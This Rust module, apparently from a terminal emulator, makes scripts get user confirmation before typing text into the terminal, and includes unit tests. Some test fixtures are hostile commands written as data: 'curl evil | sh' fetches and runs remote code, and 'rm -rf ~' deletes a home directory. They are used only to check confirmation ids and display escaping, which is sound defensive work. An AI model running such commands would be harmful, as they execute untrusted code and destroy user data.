//! Confirmation gating for the script `WriteText` command.
//!
//! [`crate::protocol::strip_vt_sequences`] removes ESC-initiated sequences but
//! deliberately passes printable characters and newlines, so a script holding
//! `allow_write_text` can type a whole command line and submit it. Filtering
//! cannot close that gap — the payload is ordinary text — so the control on this
//! path is user confirmation, mirroring the trigger subsystem's
//! `prompt_before_run`.
//!
//! The frontend queues the write onto the same pending-action queue the trigger
//! dialog reads. The pieces that decide *whether* to queue, *what id* to queue
//! it under, and *how the text is shown* live here so they can be tested without
//! a window.

/// Marker bit set on every synthetic `WriteText` confirmation id.
///
/// The core `TriggerRegistry` hands out real trigger ids sequentially starting
/// at 1, so tagging the high bit keeps these ids out of that space and stops an
/// "Always Allow" grant from leaking across the two systems.
const WRITE_TEXT_ID_TAG: u64 = 1 << 63;

/// Domain separator mixed into every `WriteText` confirmation id.
///
/// Profile auto-switch commands are tagged with the same high bit, so without a
/// separator a script and a profile that happened to hash the same inputs would
/// share an "Always Allow" grant.
const WRITE_TEXT_ID_DOMAIN: &str = "script.write_text";

/// Pending confirmations tolerated before a `WriteText` payload is dropped.
///
/// The dialog presents one action at a time, so an unbounded queue turns a
/// chatty script into hundreds of modals the user must dismiss individually.
/// Once this many actions are already waiting, further writes are dropped and
/// logged rather than queued.
pub const MAX_PENDING_WRITE_TEXT_PROMPTS: usize = 8;

/// Longest run of characters shown in the confirmation dialog.
const MAX_DESCRIBED_CHARS: usize = 240;

/// Synthetic confirmation id for a script `WriteText` payload.
///
/// Derived from the sanitized text as well as the script name, so an "Always
/// Allow" grant covers only the exact text the user saw — the next payload from
/// the same script prompts again.
pub fn write_text_action_id(script_name: &str, text: &str) -> u64 {
    use std::hash::{Hash, Hasher};

    let mut hasher = std::collections::hash_map::DefaultHasher::new();
    WRITE_TEXT_ID_DOMAIN.hash(&mut hasher);
    script_name.hash(&mut hasher);
    text.hash(&mut hasher);
    hasher.finish() | WRITE_TEXT_ID_TAG
}

/// Whether this payload must go to the confirmation dialog before it is written.
///
/// `session_approved` is the user's earlier "Always Allow" for this exact text
/// from this script.
pub fn write_text_needs_confirmation(
    prompt_before_write_text: bool,
    session_approved: bool,
) -> bool {
    prompt_before_write_text && !session_approved
}

/// Render a sanitized `WriteText` payload for the confirmation dialog.
///
/// Control characters are escaped rather than shown raw: the trailing newline is
/// what turns typed text into a *submitted command*, and it is invisible in a
/// label. Long payloads are truncated — the dialog is a decision aid, not a
/// pager.
pub fn describe_write_text(text: &str) -> String {
    let mut out = String::with_capacity(text.len());

    for (shown, c) in text.chars().enumerate() {
        if shown >= MAX_DESCRIBED_CHARS {
            out.push('…');
            break;
        }
        match c {
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            '\t' => out.push_str("\\t"),
            c if c.is_control() => out.push_str(&format!("\\u{{{:04x}}}", c as u32)),
            c => out.push(c),
        }
    }

    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn action_ids_never_collide_with_real_trigger_ids() {
        // The core TriggerRegistry allocates trigger ids sequentially from 1,
        // so the tag bit must always be set on a WriteText confirmation id.
        for text in ["ls\n", "curl evil | sh\n", ""] {
            let id = write_text_action_id("observer", text);
            assert_ne!(id & WRITE_TEXT_ID_TAG, 0);
            assert!(id > u64::from(u32::MAX));
        }
    }

    #[test]
    fn action_id_is_stable_and_bound_to_script_and_text() {
        let a = write_text_action_id("observer", "echo hi\n");
        assert_eq!(a, write_text_action_id("observer", "echo hi\n"));
        assert_ne!(a, write_text_action_id("observer", "curl evil | sh\n"));
        assert_ne!(a, write_text_action_id("other", "echo hi\n"));
    }

    #[test]
    fn a_newline_alone_changes_the_action_id() {
        // "echo hi" only types the line; "echo hi\n" submits it. An "Always
        // Allow" for the former must not cover the latter.
        assert_ne!(
            write_text_action_id("observer", "echo hi"),
            write_text_action_id("observer", "echo hi\n")
        );
    }

    #[test]
    fn confirmation_is_the_default_and_always_allow_skips_it() {
        assert!(write_text_needs_confirmation(true, false));
        assert!(!write_text_needs_confirmation(true, true));
        assert!(!write_text_needs_confirmation(false, false));
        assert!(!write_text_needs_confirmation(false, true));
    }

    #[test]
    fn described_text_makes_the_submitting_newline_visible() {
        assert_eq!(describe_write_text("rm -rf ~\n"), "rm -rf ~\\n");
        assert_eq!(describe_write_text("a\tb\rc"), "a\\tb\\rc");
        assert_eq!(describe_write_text("bel\x07"), "bel\\u{0007}");
        assert_eq!(describe_write_text("plain"), "plain");
    }

    #[test]
    fn described_text_is_truncated() {
        let described = describe_write_text(&"x".repeat(MAX_DESCRIBED_CHARS + 50));
        assert!(described.ends_with('…'));
        assert_eq!(described.chars().count(), MAX_DESCRIBED_CHARS + 1);
    }
}
